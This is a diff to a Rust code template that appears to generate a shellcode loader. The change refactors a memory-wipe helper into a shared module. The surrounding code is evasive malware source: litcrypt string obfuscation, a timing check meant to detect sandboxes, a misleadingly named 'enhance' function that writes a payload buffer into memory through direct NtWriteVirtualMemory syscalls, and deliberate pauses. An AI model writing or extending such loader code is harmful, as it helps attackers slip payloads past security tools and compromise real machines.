@@ -2,6 +2,7 @@
 #![allow(non_snake_case)]
 
 {{LITCRYPT_SETUP}}
+{{COMMON_MODULE}}
 
 use std::ptr::null_mut;
 use std::time::Instant;
@@ -38,12 +39,6 @@ fn check_environment() -> bool {
     start.elapsed().as_millis() >= 2500
 }
 
-fn wipe(buf: &mut Vec<u8>) {
-    for b in buf.iter_mut() {
-        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
-    }
-    buf.clear();
-}
 
 fn enhance(mut buf: Vec<u8>) {
     unsafe {
@@ -61,7 +56,7 @@ fn enhance(mut buf: Vec<u8>) {
         let status = syscall!("NtWriteVirtualMemory", NtCurrentProcess, region_base, src, buf_len, &mut bytes_written);
         if !NT_SUCCESS(status) { return; }
 
-        wipe(&mut buf);
+        common::wipe(&mut buf);
 
         pause(200);
 
